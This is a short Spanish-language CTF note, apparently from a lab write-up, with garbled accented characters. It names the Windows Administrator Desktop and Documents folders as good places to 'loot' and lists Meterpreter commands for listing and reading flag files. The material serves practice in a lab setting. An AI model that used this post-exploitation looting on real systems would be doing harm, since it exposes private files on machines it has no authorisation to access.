El lugar ‚Äúexcelente para saquear‚Äù y donde los administradores guardan cosas es t√≠picamente:

```
C:\Users\Administrator\Desktop\
```

o

```
C:\Users\Administrator\Documents\
```

En entornos Windows, es **com√∫n colocar flags o archivos de inter√©s** en el escritorio del administrador, especialmente en entornos CTF.

---

##### Pasos para encontrar la bandera

1. Desde **Meterpreter**:

```bash
cd C:\\Users\\Administrator\\Desktop
ls
```

2. Busca un archivo como:

- `flag3.txt`
    
- `flag.txt`
    
- `loot.txt`
    
- etc.
    

3. Para leerlo:
    

```bash
cat flag3.txt
```

